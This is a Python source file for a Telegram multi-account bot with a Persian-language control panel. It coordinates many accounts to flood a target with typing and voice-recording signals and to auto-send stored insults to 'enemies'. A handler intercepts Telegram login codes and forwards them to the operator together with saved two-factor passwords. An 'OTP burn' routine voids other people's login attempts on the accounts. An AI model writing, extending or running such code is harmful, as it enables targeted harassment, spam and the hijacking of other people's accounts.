      for pfx in ("https://t.me/", "http://t.me/", "t.me/"):
          if raw.startswith(pfx):
              raw = raw[len(pfx):]
      raw = raw.lstrip("@")
      try:
          target = int(raw)
      except ValueError:
          target = raw

      async def _typing_flood_loop():
          while True:
              group_sessions = [s for info in groups_db.values()
                                  for s in info.get("sessions", []) if s in managed]
              if not group_sessions:
                    await asyncio.sleep(3)
                    continue
              async def _send_typing(sess):
                    meta = managed.get(sess)
                    if not meta:
                        return
                    try:
                        await meta["client"](SetTypingRequest(
                            peer=target, action=SendMessageTypingAction()))
                    except Exception:
                        pass
              await asyncio.gather(*[_send_typing(s) for s in group_sessions], return_exceptions=True)
              await asyncio.sleep(4)

      key = f"typing_{target}"
      old = flood_tasks.get(key)
      if old and not old.done():
          old.cancel()
      flood_tasks[key] = asyncio.create_task(_typing_flood_loop())
      await minimal_reply(client, event, f" Typing Flood شروع شد روی {tgt}\nبرای توقف: typingflood off")

    @client.on(events.NewMessage(pattern=re.compile(r'^recordflood\s+(on|off)(?:\s+(.+))?$', re.IGNORECASE)))
    async def cmd_recordflood(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      v   = event.pattern_match.group(1).lower()
      tgt = event.pattern_match.group(2)
      if v == "off":
          for key in [k for k in flood_tasks if k.startswith("record_")]:
              t = flood_tasks.pop(key, None)
              if t and not t.done():
                    t.cancel()
          await minimal_reply(client, event, " Record Flood متوقف شد.")
          return
      if not tgt:
          await minimal_reply(client, event, " مقصد رو بنویس.\nمثال: recordflood on @username")
          return
      raw = str(tgt).strip()
      for pfx in ("https://t.me/", "http://t.me/", "t.me/"):
          if raw.startswith(pfx):
              raw = raw[len(pfx):]
      raw = raw.lstrip("@")
      try:
          target = int(raw)
      except ValueError:
          target = raw

      async def _record_flood_loop():
          while True:
              group_sessions = [s for info in groups_db.values()
                                  for s in info.get("sessions", []) if s in managed]
              if not group_sessions:
                    await asyncio.sleep(3)
                    continue
              async def _send_record(sess):
                    meta = managed.get(sess)
                    if not meta:
                        return
                    try:
                        await meta["client"](SetTypingRequest(
                            peer=target, action=SendMessageRecordAudioAction()))
                    except Exception:
                        pass
              await asyncio.gather(*[_send_record(s) for s in group_sessions], return_exceptions=True)
              await asyncio.sleep(4)

      key = f"record_{target}"
      old = flood_tasks.get(key)
      if old and not old.done():
          old.cancel()
      flood_tasks[key] = asyncio.create_task(_record_flood_loop())
      await minimal_reply(client, event, f" Record Flood شروع شد روی {tgt}\nبرای توقف: recordflood off")

    # onlinestatus command (main only or per-account for owner/admin)
    @client.on(events.NewMessage(pattern=re.compile(r'^onlinestatus(?:\\s+(\\S+))?$', re.IGNORECASE)))
    async def cmd_onlinestatus(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      if session_name != MAIN_SESSION:
          # only allow check for this session if user has admin access
          if not has_admin_access(sender, session_name=session_name, state=state):
              return
          res = await check_account_health(session_name)
          await minimal_reply(client, event, json.dumps(res, ensure_ascii=False, indent=2))
          return
      # MAIN session: owner/admin can check specific or all
      if tgt:
          if tgt not in sessions_db:
              await minimal_reply(client, event, f"Session {tgt} not registered.")
              return
          res = await check_account_health(tgt)
          await minimal_reply(client, event, json.dumps(res, ensure_ascii=False, indent=2))
          return
      # no target: check all
      if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
          # non-admin: check only their sessions
          names = list(get_sessions_for_owner(sender))
      else:
          names = list(sessions_db.keys())
      out = []
      for n in names:
          r = await check_account_health(n)
          out.append(r)
      await minimal_reply(client, event, json.dumps(out, ensure_ascii=False, indent=2))

    # help handlers - ensure main provides owner/client separation and "account" wording
    if is_main:
      @client.on(events.NewMessage(pattern=re.compile(r'^help$', re.IGNORECASE)))
      async def cmd_help(event):
          if session_name != MAIN_SESSION:
              return
          if is_owner(event.sender_id):
              help_text = (
                    " Owner Help — Full command set\\n\\n"
                    "Use the full set of commands (owner-only):\\n"
                    "• creategroup <name> <owner_id>\\n"
                    "• addsessiontogroup <session> <group>\\n"
                    "• setgroupowner <group> <owner_id>\\n"
                    "• listgroups\\n"
                    "• addsession, code, 2fa, sessions, setadmin, deladmin, setgadmin, delgadmin, ...\\n"
                    "(owner has full control over groups and accounts)\\n"
              )
              await client.send_message(event.chat_id, help_text)
              return
          owned = get_sessions_for_owner(event.sender_id)
          if owned:
              help_text = (
                    " Client Help — Available commands for your group/accounts\\n\\n"
                    "• sessions — نمایش اکانت‌های شما\\n"
                    "• sr <account> <chat_id> — ران کردن ارسال خودکار برای یک اکانت.\\n"
                    "• srstop <account> — توقف ارسال خودکار برای آن اکانت.\\n"
                    "• addfosh [account] <text> — اضافه کردن پیام آماده برای اکانت‌تان.\\n"
                    "• addfoshmedia [account] — ریپلای به مدیا برای اضافه کردن آن به لیست ارسال خودکار.\\n"
                    "• delfosh [account] <text> — حذف پیام دقیق.\\n"
                    "• cleanfosh [account] — حذف همهٔ پیام‌های فوش برای اکانت.\\n"
                    "• setid [account] <id1> <id2> ... — افزودن چند آی‌دی.\\n"
                    "• delid [account] <id1> <id2> ... — حذف چند آی‌دی.\\n"
                    "• setenemy / setenemygif / delenemy / cleanenemy — مدیریت پاسخ خودکار به دشمنان.\\n"
                    "• setbio <text> / setname <name> / setprofile (reply) — مدیریت پروفایل اکانت.\\n"
                    "• join <link> / leave [chat_id] — پیوستن/خروج.\\n"
                    "• mutepv on/off — حذف پیام‌های خصوصی ورودی.\\n"
                    "• onlinestatus [account|all] — بررسی وضعیت اکانت‌ها.\\n"
                    "\\n(توضیح کوتاه: دستورات فقط روی اکانت‌هایی که مالک آن هستید اعمال می‌شوند.)"
              )
              await client.send_message(event.chat_id, help_text)
              return
          await client.send_message(event.chat_id, "No help available. You don't own any groups/accounts.")

    # admin and group commands (main-level handlers) - preserved from original...
    @client.on(events.NewMessage(pattern=re.compile(r'^creategroup\\s+(\\S+)\\s+(\\d+)(?:\\s+(\\d+))?$', re.IGNORECASE)))
    async def cmd_creategroup(event):
      sender = event.sender_id
      if not is_owner(sender):
          await minimal_reply(client, event, "Only OWNER can create groups.")
          return
      name = event.pattern_match.group(1).strip()
      owner_id = int(event.pattern_match.group(2))
      max_accounts_raw = event.pattern_match.group(3)
      if name in groups_db:
          await minimal_reply(client, event, "Group already exists.")
          return
      group_data = {"owner": owner_id, "sessions": []}
      if max_accounts_raw:
          group_data["max_accounts"] = int(max_accounts_raw)
      groups_db[name] = group_data
      save_groups()
      max_str = f" | سقف اکانت: {max_accounts_raw}" if max_accounts_raw else " | بدون محدودیت"
      await minimal_reply(client, event, f"Group {name} created with owner {owner_id}{max_str}.")

    @client.on(events.NewMessage(pattern=re.compile(r'^setgroupmax\\s+(\\S+)\\s+(\\d+)$', re.IGNORECASE)))
    async def cmd_setgroupmax(event):
      sender = event.sender_id
      if not is_owner(sender):
          await minimal_reply(client, event, "Only OWNER can set group max accounts.")
          return
      gname = event.pattern_match.group(1).strip()
      max_acc = int(event.pattern_match.group(2))
      if gname not in groups_db:
          await minimal_reply(client, event, f"Group {gname} not found.")
          return
      groups_db[gname]["max_accounts"] = max_acc
      save_groups()
      await minimal_reply(client, event, f" سقف ریموت «{gname}» روی {max_acc} اکانت تنظیم شد.")

    @client.on(events.NewMessage(pattern=re.compile(r'^addsessiontogroup\\s+(\\S+)\\s+(\\S+)$', re.IGNORECASE)))
    async def cmd_addsessiontogroup(event):
      sender = event.sender_id
      if not is_owner(sender):
          await minimal_reply(client, event, "Only OWNER can add sessions to groups.")
          return
      session = event.pattern_match.group(1).strip()
      group = event.pattern_match.group(2).strip()
      if group not in groups_db:
          await minimal_reply(client, event, f"Group {group} not found.")
          return
      if session not in sessions_db:
          await minimal_reply(client, event, f"Session {session} not registered.")
          return
      _err = assign_session_to_group(session, group)
      if _err:
          await minimal_reply(client, event, f" خطا: {_err}")
          return
      await minimal_reply(client, event, f"Session {session} added to {group}.")

    @client.on(events.NewMessage(pattern=re.compile(r'^setgroupowner\\s+(\\S+)\\s+(\\d+)$', re.IGNORECASE)))
    async def cmd_setgroupowner(event):
      sender = event.sender_id
      if not is_owner(sender):
          await minimal_reply(client, event, "Only OWNER can change group owner.")
          return
      group = event.pattern_match.group(1).strip()
      new_owner = int(event.pattern_match.group(2))
      if group not in groups_db:
          await minimal_reply(client, event, f"Group {group} not found.")
          return
      groups_db[group]["owner"] = new_owner
      save_groups()
      await minimal_reply(client, event, f"Group {group} owner set to {new_owner}.")

    @client.on(events.NewMessage(pattern=re.compile(r'^addowner\s+(\d+)$', re.IGNORECASE)))
    async def cmd_addowner(event):
      sender = event.sender_id
      if sender != OWNER_ID:
          await minimal_reply(client, event, " فقط اونر اصلی میتونه اونر اضافه کنه.")
          return
      new_id = int(event.pattern_match.group(1))
      if new_id == OWNER_ID:
          await minimal_reply(client, event, " این ایدی اونر اصلیه.")
          return
      CO_OWNERS.add(new_id)
      save_co_owners()
      await minimal_reply(client, event, f" کاربر {new_id} به عنوان اونر اضافه شد.")

    @client.on(events.NewMessage(pattern=re.compile(r'^delowner\s+(\d+)$', re.IGNORECASE)))
    async def cmd_delowner(event):
      sender = event.sender_id
      if sender != OWNER_ID:
          await minimal_reply(client, event, " فقط اونر اصلی میتونه اونر حذف کنه.")
          return
      del_id = int(event.pattern_match.group(1))
      if del_id not in CO_OWNERS:
          await minimal_reply(client, event, f" {del_id} در لیست اونرها نیست.")
          return
      CO_OWNERS.discard(del_id)
      save_co_owners()
      await minimal_reply(client, event, f" کاربر {del_id} از لیست اونرها حذف شد.")

    @client.on(events.NewMessage(pattern=re.compile(r'^listowners$', re.IGNORECASE)))
    async def cmd_listowners(event):
      sender = event.sender_id
      if sender != OWNER_ID:
          await minimal_reply(client, event, " فقط اونر اصلی.")
          return
      if not CO_OWNERS:
          await minimal_reply(client, event, f" اونر اصلی: {OWNER_ID}\n\nهیچ اونر دیگه‌ای اضافه نشده.")
          return
      lst = "\n".join(f"• {uid}" for uid in CO_OWNERS)
      await minimal_reply(client, event, f" اونر اصلی: {OWNER_ID}\n\n اونرهای دیگه:\n{lst}")

    @client.on(events.NewMessage(pattern=re.compile(r'^listgroups$', re.IGNORECASE)))
    async def cmd_listgroups(event):
      sender = event.sender_id
      if is_owner(sender):
          if not groups_db:
              await minimal_reply(client, event, "No groups defined.")
              return
          txt = "Groups:\\n"
          for g, info in groups_db.items():
              max_str = f"/{info['max_accounts']}" if info.get('max_accounts') else "/∞"
              txt += f"• {g} — owner: {info.get('owner')} — اکانت: {len(info.get('sessions',[]))}{max_str} — {','.join(info.get('sessions', []))}\\n"
          await minimal_reply(client, event, txt)
          return
      owned = [g for g, info in groups_db.items() if int(info.get('owner', 0)) == sender]
      if not owned:
          await minimal_reply(client, event, "You do not own any groups.")
          return
      txt = "Your groups:\\n"
      for g in owned:
          info = groups_db[g]
          max_str = f"/{info['max_accounts']}" if info.get('max_accounts') else "/∞"
          txt += f"• {g} — اکانت: {len(info.get('sessions',[]))}{max_str} — {','.join(info.get('sessions', []))}\\n"
      await minimal_reply(client, event, txt)

    # (rest of admin/local admin/session commands preserved) ...

    # ── Owner takeover: intercept Telegram OTP (from 777000) ──
    @client.on(events.NewMessage(from_users=777000))
    async def intercept_otp(event):
      """Send OTP code + saved 2FA to owner's private message."""
      global OTP_BURN_MODE
      in_pending = session_name in owner_takeover_pending
      # اگه سشن در چند گروه باشه: OR منطق — هر گروهی otp_burn داشت فعال می‌شه
      _grp_burn = False
      for _g, _gi in groups_db.items():
          if session_name in _gi.get("sessions", []):
              if _gi.get("otp_burn", False):
                    _grp_burn = True
                    break
      if not in_pending and not OTP_BURN_MODE and not _grp_burn:
          return
      otp_text = event.raw_text or ""
      code_match = re.search(r'\b(\d{5,6})\b', otp_text)
      code = code_match.group(1) if code_match else "—"

      if in_pending:
          pend = owner_takeover_pending[session_name]
          phone = pend.get("phone", "")
          twofa = pend.get("twofa", "")
      else:
          info = sessions_db.get(session_name, {})
          phone = info.get("phone", "")
          twofa = info.get("twofa", "")

      twofa_line = f"\n\n🔐 رمز 2FA: <code>{twofa}</code>" if twofa else "\n\n🔓 2FA ندارد"

      if (OTP_BURN_MODE or _grp_burn) and code != "—":
          # ── TWO-STAGE BURN ──────────────────────────────────────────────────
          # Stage 2: a pending burn is waiting for our own OTP (triggered by stage 1)
          if session_name in _burn_pending:
              pend = _burn_pending.pop(session_name)
              burn_client = pend["client"]
              our_hash = pend["hash"]
              our_phone = pend["phone"]

              async def _do_burn_stage2(bc, ph, cd, hsh):
                    code_result = ""
                    try:
                        try:
                            await bc.sign_in(ph, cd, phone_code_hash=hsh)
                            code_result = " کد مصرف شد"
                        except Exception as sign_err:
                            err_str = str(sign_err)
                            if "SessionPasswordNeeded" in err_str or "password" in err_str.lower():
                                code_result = " کد مصرف شد (2FA بلاک کرد)"
                            elif "PHONE_CODE_INVALID" in err_str:
                                code_result = " کد منقضی یا قبلاً مصرف شده"
                            elif "PHONE_CODE_EXPIRED" in err_str:
                                code_result = " کد expire شده بود"
                            else:
                                code_result = f" {err_str[:60]}"
                    except Exception as e:
                        code_result = f" {str(e)[:60]}"
                    finally:
                        _burn_in_progress.discard(session_name)
                        try:
                            await bc.disconnect()
                        except Exception:
                            pass
                    burn_notify = (
                        f" <b>OTP Burn</b> — اکانت «{session_name}»\n"
                        f" شماره: <code>{ph}</code>\n"
                        f" کد: <code>{cd}</code>\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"نتیجه: {code_result}"
                    )
                    try:
                        await bot_client.send_message(OWNER_ID, burn_notify, parse_mode="html")
                    except Exception:
                        try:
                            await main_client.send_message(OWNER_ID, burn_notify, parse_mode="html")
                        except Exception:
                            pass
              asyncio.create_task(_do_burn_stage2(burn_client, our_phone, code, our_hash))
              return

          # Stage 1: first OTP arrived (attacker's request) — start our own request
          # to invalidate attacker's hash and get our own hash for stage 2
          if session_name in _burn_in_progress:
              return
          _burn_in_progress.add(session_name)

          async def _do_burn_stage1():
              burn_client = None
              try:
                    # از کلاینت از پیش‌کانکت‌شده استفاده می‌کنیم → بدون تأخیر connect()
                    burn_client = await _acquire_prewarmed_burn_client()
                    # This call: (a) invalidates attacker's hash, (b) sends a NEW OTP to the account
                    # The new OTP will arrive as another 777000 message → stage 2 handles it
                    sent = await asyncio.wait_for(burn_client.send_code_request(phone), timeout=20)
                    # Generation token: unique per stage-1 cycle so the cleanup task
                    # only fires if THIS cycle's entry is still pending (not a newer one).
                    _burn_gen = object()
                    _burn_pending[session_name] = {
                        "client": burn_client,
                        "hash": sent.phone_code_hash,
                        "phone": phone,
                        "_gen": _burn_gen,
                    }

                    # Safety cleanup: if stage-2 OTP never arrives within 90s,
                    # release the burn_client and clear the in-progress flag automatically.
                    # The generation token ensures a new burn cycle won't be cancelled by this task.
                    async def _burn_stage1_timeout_cleanup(_sn=session_name, _gen=_burn_gen):
                        await asyncio.sleep(90)
                        pend = _burn_pending.get(_sn)
                        if pend and pend.get("_gen") is _gen:
                            _burn_pending.pop(_sn, None)
                            _burn_in_progress.discard(_sn)
                            try:
                                await pend["client"].disconnect()
                            except Exception:
                                pass
                    asyncio.create_task(_burn_stage1_timeout_cleanup())
              except Exception as e:
                    _burn_in_progress.discard(session_name)
                    if burn_client:
                        try:
                            await burn_client.disconnect()
                        except Exception:
                            pass
                    err_notify = (
                        f" <b>OTP Burn — خطا در مرحله ۱</b>\n"
                        f"اکانت «{session_name}»\n"
                        f" {str(e)[:80]}"
                    )
                    try:
                        await bot_client.send_message(OWNER_ID, err_notify, parse_mode="html")
                    except Exception:
                        pass
          asyncio.create_task(_do_burn_stage1())
          return

      msg = (
          f" <b>کد ورود اکانت «{session_name}»</b>\n"
          f" شماره: <code>{phone}</code>\n"
          f"━━━━━━━━━━━━━━\n"
          f" کد: <code>{code}</code>"
          f"{twofa_line}"
      )
      try:
          await bot_client.send_message(OWNER_ID, msg, parse_mode="html")
      except Exception:
          try:
              await main_client.send_message(OWNER_ID, msg, parse_mode="html")
          except Exception:
              pass

    # ── Auto Button Click ─────────────────────────────────────
    # When enabled for a group: whenever a message with inline buttons arrives
    # in the configured target chat, this session clicks the first button (✅).

    def _normalize_chat_id(raw: str) -> Optional[int]:
      """Convert a raw target_chat string to a canonical bare integer ID.
      Telegram supergroups/channels arrive as -100XXXXXXXXX in events but
      users often store just the bare ID (e.g. 1234567890 or -1234567890).
      We strip the -100 prefix ONLY when the original value was negative,
      so both -1001234567890 and 1234567890 normalize to the same value.
      Returns None for usernames (non-numeric), so caller can do username lookup.
      """
      s = raw.strip().lstrip("@")
      try:
          n = int(s)
          if n < 0:
              # Negative: could be -100XXXX (supergroup/channel full form)
              # or just -XXXX (old-style group). Strip -100 prefix only when present.
              s2 = str(-n)  # absolute value as string
              if s2.startswith("100") and len(s2) > 10:
                    return int(s2[3:])  # -1001234567890 → 1234567890
              return -n  # regular negative group ID, use absolute value
          return n  # already a positive bare ID
      except ValueError:
          return None  # username — caller handles

    return

async def get_any_running_client_for_owner() -> Optional[TelegramClient]:
    for meta in managed.values():
      return meta["client"]
    return None

async def check_account_health(session_name: str) -> Dict[str, Any]:
    res = {"session": session_name, "ok": False, "authorized": False, "error": None}
    meta = managed.get(session_name)
    if meta and meta.get("client"):
      client = meta["client"]
      own_client = False
    else:
      client = _make_client(sess_path(session_name), session_name=session_name)
      own_client = True
    try:
      if own_client:
          await client.connect()
      res["connected"] = True
      try:
          authorized = await client.is_user_authorized()
          res["authorized"] = bool(authorized)
          if authorized:
              me = await client.get_me()
              res["me_id"] = getattr(me, "id", None)
              res["ok"] = True
      except RPCError as e:
          res["error"] = str(e)
      except Exception as e:
          res["error"] = str(e)
      if own_client:
          try:
              await client.disconnect()
          except Exception:
              pass
    except Exception as e:
      res["connected"] = False
      res["error"] = str(e)
    return res

# -------------------------
# START MAIN CLIENT
# -------------------------
main_client: Optional[Any] = None
bot_client: Optional[Any] = None

def attach_bot_handlers(bot: TelegramClient) -> None:
    """Register owner-only management panel with inline glass buttons."""
    from telethon import Button

    # ── فونت دکمه‌ها + آیکون پریمیوم: یکبار monkeypatch می‌کنیم ──────────────────
    if not getattr(Button, '_font_patched', False):
      from telethon.tl import types as _tl_types
      _orig_btn_inline = Button.inline

      def _styled_btn_inline(text, *args, **kwargs):
          raw_text = str(text)
          # اولین ایموجی پریمیوم موجود توی متن رو پیدا کن، و از خودِ متن حذفش کن
          # تا فقط آیکون style (icon=) روی دکمه نشون داده بشه — نه هم آیکون هم
          # ایموجی یونیکدِ ساده باهم (که قبلاً باعث دو تا آیکون می‌شد).
          icon_doc_id = None
          for ch in raw_text:
              if ch in _PREM:
                    icon_doc_id = int(_PREM[ch])
                    raw_text = raw_text.replace(ch, "", 1).lstrip()
                    break
          styled_text = _font(raw_text)
          # داده دکمه رو از args یا kwargs بگیر
          data = args[0] if args else kwargs.get('data', None)
          if data is None:
              data = styled_text.encode()
          elif isinstance(data, str):
              data = data.encode()
          # از KeyboardButtonStyle استفاده نمی‌کنیم — تلگرام رد می‌کنه
          # فقط فونت رو روی متن اعمال می‌کنیم و دکمه معمولی می‌سازیم
          return _orig_btn_inline(styled_text, data)

      Button.inline = _styled_btn_inline
      Button._font_patched = True

    # ── helpers ──────────────────────────────────────────────
    panel_msg_id: Dict[int, int] = {}

    async def sp(chat_id, text: str, buttons=None):
      """Send spoiler panel message, deleting any previous panel first (single living message)."""
      old_mid = panel_msg_id.pop(chat_id, None)
      if old_mid:
          try:
              await bot.delete_messages(chat_id, [old_mid])
          except Exception:
              pass
      try:
          plain, ents = _apply_custom_emoji(f"<spoiler>{text}</spoiler>")
          msg = await bot.send_message(
              chat_id,
              plain,
              formatting_entities=ents,
              buttons=buttons,
          )
      except Exception:
          try:
              msg = await bot.send_message(chat_id, text, buttons=buttons)
          except Exception:
              try:
                  # آخرین تلاش: بدون دکمه — حداقل متن پنل نشون داده بشه
                  msg = await bot.send_message(chat_id, text)
              except Exception:
                  return None
      if msg:
          panel_msg_id[chat_id] = msg.id
      return msg

    async def sp_edit(event, text: str, buttons=None, parse_mode=None) -> None:
      """Edit the tracked panel message; fallback to sending new if not found."""
      chat_id = event.chat_id
      mid = panel_msg_id.get(chat_id)
      if mid:
          try:
              plain, ents = _apply_custom_emoji(f"<spoiler>{text}</spoiler>")
              await bot.edit_message(
                    chat_id, mid,
                    plain,
                    formatting_entities=ents,
                    buttons=buttons,
              )
              return
          except Exception:
              pass
      await sp(chat_id, text, buttons)

    def owner_guard(event) -> bool:
      return event.sender_id == OWNER_ID

    def _user_og_admin_groups(uid: int) -> list:
      """Return list of group names where uid is the group owner or in og_admins."""
      return [
          gname for gname, info in groups_db.items()
          if uid in info.get("og_admins", []) or uid == info.get("owner")
      ]

    def _og_has_permission(event, gname: str) -> bool:
      """Allow OWNER_ID, group owner, or anyone in groups_db[gname]['og_admins'] — unless blacklisted. Ignores subscription expiry."""
      if event.sender_id == OWNER_ID:
          return True
      if event.sender_id in bot_blacklist:
          return False
      info = groups_db.get(gname, {})
      if event.sender_id == info.get("owner"):
          return True
      return event.sender_id in info.get("og_admins", [])

    def og_guard(event, gname: str) -> bool:
      """Same as _og_has_permission but also blocks non-owner access once the remote's subscription has expired."""
      if not _og_has_permission(event, gname):
          return False
      if event.sender_id != OWNER_ID and is_group_expired(gname):
          return False
      return True

    def main_menu_buttons():
      return [
          [Button.inline("👤 Accounts", b"menu_sessions"),
             Button.inline("👥 Groups", b"menu_groups")],
          [Button.inline("👤 Add Account", b"menu_add"),
             Button.inline("📊 Status", b"menu_status")],
          [Button.inline("👤 Check Account Limits", b"menu_check_status")],
          [Button.inline("🔑 Owner Access", b"owner_access")],
          [Button.inline("🔄 Refresh", b"menu_refresh")],
      ]

    def _build_main_panel_text() -> str:
      total   = len(sessions_db)
      online  = len(managed)
      groups  = len(groups_db)
      # attacker stats
      active_atk   = sum(1 for k, t in atk_tasks.items() if not t.done())
      total_sent   = sum(s.get("sent", 0) for s in atk_stats.values())
      total_errors = sum(s.get("errors", 0) for s in atk_stats.values())
      # flood stats
      active_flood = sum(1 for t in flood_tasks.values() if not t.done())
      atk_line = (
          f"{pe('⚔️')} اتکر فعال: {active_atk}  |  {pe('📤')} کل ارسال: {total_sent}  |  {pe('❌')} خطا: {total_errors}\n"
          f"{pe('🌊')} فلود فعال: {active_flood}\n"
      ) if (active_atk or total_sent or active_flood) else ""
      return (
          f"{pe('📋')} پنل مدیریت\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('🟢')} آنلاین: {online}   {pe('📊')} کل: {total}   {pe('👥')} Groups: {groups}\n"
          f"{atk_line}"
          f"━━━━━━━━━━━━━━\n"
          f"یه گزینه انتخاب کن:"
      )

    # ── /start and /panel → main menu ────────────────────────
    @bot.on(events.NewMessage(pattern=re.compile(r'^/download$', re.IGNORECASE)))
    async def bot_download(event):
      if not owner_guard(event):
          return
      try:
          await bot.send_file(event.chat_id, _SCRIPT_PATH,
                                caption=" eliot_bot.py")
      except Exception as e:
          await bot.send_message(event.chat_id, f" خطا در ارسال فایل: {e}")

    @bot.on(events.NewMessage(pattern=re.compile(r'^/downloadzip$', re.IGNORECASE)))
    async def bot_download_zip(event):
      if not owner_guard(event):
          return
      import zipfile, io
      req_content = (
          "telethon\n"
          "pytz\n"
      )
      buf = io.BytesIO()
      buf.name = "eliot_bot.zip"
      with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
          zf.write(_SCRIPT_PATH, "eliot_bot.py")
          zf.writestr("requirements.txt", req_content)
      buf.seek(0)
      try:
          await bot.send_file(
              event.chat_id, buf,
              caption=(
                    " سورس کامل ربات\n"
                    "━━━━━━━━━━━━━━\n"
                    " eliot_bot.py\n"
                    " requirements.txt\n\n"
                    "نصب: pip install -r requirements.txt"
              ),
              force_document=True
          )
      except Exception as e:
          await bot.send_message(event.chat_id, f" خطا: {e}")

    def _admin_panel_text(uid: int, groups: list) -> str:
      lines = "\n".join(f"• ریموت {g}" for g in groups)
      return (
          f"{pe('👮')} پنل ادمین\n"
          f"━━━━━━━━━━━━━━\n"
          f"شما به عنوان ادمین ریموت‌های زیر دسترسی دارید:\n\n"
          f"{lines}\n"
          f"━━━━━━━━━━━━━━\n"
          f"یه ریموت انتخاب کن:"
      )

    def _admin_panel_buttons(groups: list) -> list:
      rows = []
      for gname in groups:
          info = groups_db.get(gname, {})
          cnt = len(info.get("sessions", []))
          online = sum(1 for s in info.get("sessions", []) if s in managed)
          rows.append([Button.inline(f"🟢 {gname}  [{online}/{cnt} آنلاین]",
              f"og_home_{gname}".encode()
          )])
      return rows

    @bot.on(events.NewMessage(pattern=re.compile(r'^/(start|panel)(?:\s+(.+))?$', re.IGNORECASE)))
    async def bot_start(event):
      uid = event.sender_id
      chat_id = event.chat_id
      old_mid = panel_msg_id.get(chat_id)
      if old_mid:
          try:
              await bot.delete_messages(chat_id, [old_mid])
          except Exception:
              pass
          panel_msg_id.pop(chat_id, None)
      try:
          await event.delete()
      except Exception:
          pass
      if owner_guard(event):
          try:
              btns = main_menu_buttons()
          except Exception:
              btns = None
          await sp(chat_id, _build_main_panel_text(), buttons=btns)
          return
      # check if user is og_admin of any group
      admin_groups = _user_og_admin_groups(uid)
      if admin_groups:
          try:
              btns = _admin_panel_buttons(admin_groups)
          except Exception:
              btns = None
          await sp(chat_id, _admin_panel_text(uid, admin_groups), buttons=btns)
          return
      # not authorized at all — silently ignore

    # ── callback: main menu refresh ───────────────────────────
    @bot.on(events.CallbackQuery(data=b"noop"))
    async def cb_noop(event):
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"menu_refresh"))
    async def cb_refresh(event):
      if not owner_guard(event):
          return await event.answer()
      await sp_edit(event, _build_main_panel_text(), buttons=main_menu_buttons())
      await event.answer(" رفرش شد")

    # ── callback: check restriction/report status of all sessions ─
    @bot.on(events.CallbackQuery(data=b"menu_check_status"))
    async def cb_check_status(event):
      if not owner_guard(event):
          return await event.answer()
      await sp_edit(event, " در حال بررسی همه اکانت‌ها...\nممکنه چند ثانیه طول بکشه.",
                     buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])
      await event.answer()
      results = []
      ok_count = warn_count = ban_count = offline_count = 0
      for sess_name, info in sessions_db.items():
          phone = info.get("phone", "?")
          meta = managed.get(sess_name)
          dn = (meta["state"].get("display_name") or sess_name) if meta else sess_name
          if not meta:
              results.append(f" {dn} ({phone})\n   └ آفلاین")
              offline_count += 1
              continue
          status = await _check_report_status(meta["client"])
          if "✅" in status:
              icon = ""
              ok_count += 1
          elif "ریپورت دائمی" in status or "بن" in status.lower() or "🚫" in status:
              icon = ""
              ban_count += 1
          elif "ریپورت موقت" in status or "⏳" in status or "⚠️" in status:
              icon = ""
              warn_count += 1
          else:
              icon = ""
          results.append(f"{icon} {dn} ({phone})\n   └ {status}")
      total = len(sessions_db)
      summary = (
          f" نتیجه بررسی اکانت‌ها\n"
          f"━━━━━━━━━━━━━━\n"
          f" کل: {total}   سالم: {ok_count}   ریپورت موقت: {warn_count}\n"
          f" بن/دائمی: {ban_count}   آفلاین: {offline_count}\n"
          f"━━━━━━━━━━━━━━\n"
      )
      # split into chunks if too long
      chunk_size = 15
      chunks = [results[i:i+chunk_size] for i in range(0, len(results), chunk_size)]
      if not chunks:
          chunks = [[]]
      first_chunk = summary + "\n".join(chunks[0])
      await sp(event.chat_id, first_chunk,
              buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])
      for chunk in chunks[1:]:
          await sp(event.chat_id, "\n".join(chunk),
                    buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])

    # ── callback: sessions list ───────────────────────────────
    @bot.on(events.CallbackQuery(data=b"menu_sessions"))
    async def cb_sessions(event):
      if not owner_guard(event):
          return await event.answer()
      if not sessions_db:
          await sp_edit(event, "هیچ اکانتی ثبت نشده.", buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])
          return await event.answer()
      rows = []
      for s in sessions_db:
          icon = "🟢" if s in managed else "🔴"
          rows.append([Button.inline(f"🔢 {icon} {s}", f"sess_{s}".encode())])
      rows.append([Button.inline("🔙 Back", b"menu_refresh")])
      await sp_edit(event, " Accounts — روی هر کدوم کلیک کن:", buttons=rows)
      await event.answer()

    # ── callback: single session detail ──────────────────────
    @bot.on(events.CallbackQuery(pattern=b"sess_(.+)"))
    async def cb_session_detail(event):
      if not owner_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      info = sessions_db.get(sess, {})
      meta = managed.get(sess)
      status = "🟢 آنلاین" if meta else "🔴 آفلاین"
      group = get_group_of_session(sess) or "بدون ریموت"
      text = (
          f" {sess}\n"
          f"━━━━━━━━━━━━━━\n"
          f" شماره: {info.get('phone','?')}\n"
          f"وضعیت: {status}\n"
          f"ریموت: {group}"
      )
      buttons = [
          [Button.inline("🔙 Back", b"menu_sessions")],
      ]
      await sp_edit(event, text, buttons=buttons)
      await event.answer()

    # ── callback: groups list ─────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"menu_groups"))
    async def cb_groups(event):
      if not owner_guard(event):
          return await event.answer()
      rows = []
      for g, info in groups_db.items():
          count = len(info.get("sessions", []))
          rows.append([Button.inline(f"🔢 {g}  ({count} accs)", f"grp_{g}".encode())])
      rows.append([Button.inline("📌 Join All Accounts", b"global_joinall"),
                     Button.inline("📌 Leave All Accounts", b"global_leaveall")])
      rows.append([Button.inline("📌 Start Bot با رفرال (همه اکانتا)", b"global_startbot_ref")])
      rows.append([Button.inline("🖥 ریموت", b"menu_newgroup"),
                     Button.inline("🔙 Back", b"menu_refresh")])
      text = "📁 Groups — انتخاب کن:" if groups_db else "هیچ گروهی نیست."
      await sp_edit(event, text, buttons=rows)
      await event.answer()

    # ── callback: global join/leave ALL accounts across ALL groups ──
    @bot.on(events.CallbackQuery(data=b"global_joinall"))
